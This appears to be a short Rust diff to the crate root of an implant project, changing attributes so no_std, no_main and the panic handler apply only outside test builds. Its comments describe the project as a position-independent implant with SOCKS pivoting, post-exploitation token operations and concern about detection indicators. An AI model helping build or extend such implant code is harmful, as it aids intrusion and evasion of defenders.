@@ -40,8 +40,8 @@
 //! - [`pivot`] / [`postex`] — SOCKS relay across cycles / token ops.
 //! - [`entry`] / [`selftests`] — PIC entry + per-module `rundll32` self-tests.
 
-#![no_std]
-#![no_main]
+#![cfg_attr(not(test), no_std)]
+#![cfg_attr(not(test), no_main)]
 
 extern crate alloc;
 
@@ -131,6 +131,7 @@ pub mod version;
 #[global_allocator]
 static HEAP: ntalloc::NtHeapAllocator = ntalloc::NtHeapAllocator;
 
+#[cfg(not(test))]
 #[panic_handler]
 fn _panic(info: &core::panic::PanicInfo) -> ! {
     // panic = abort. In a PIC implant an infinite spin is a loud IOC (one core
